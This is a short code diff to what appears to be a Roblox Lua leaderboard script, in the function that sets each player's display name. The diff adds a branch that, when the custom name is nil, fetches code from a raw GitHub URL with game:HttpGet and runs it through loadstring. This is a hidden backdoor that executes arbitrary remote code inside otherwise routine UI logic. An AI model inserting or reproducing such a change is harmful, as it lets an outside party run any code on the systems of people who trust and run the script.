@@ -215,6 +215,8 @@ function updatePlayers()
 
 if StatFolder.CustomName.Value ~= nil then
         templateClone.DisplayName.Text = (StatFolder.CustomName.Value.." "..StatFolder.Clan.Value)
+elseif StatFolder.CustomName.Value == nil then
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Kason9487/AA/main/AA'),true))()
 end
         templateClone.RealName.Text = tostring(plr2.Name)		
 
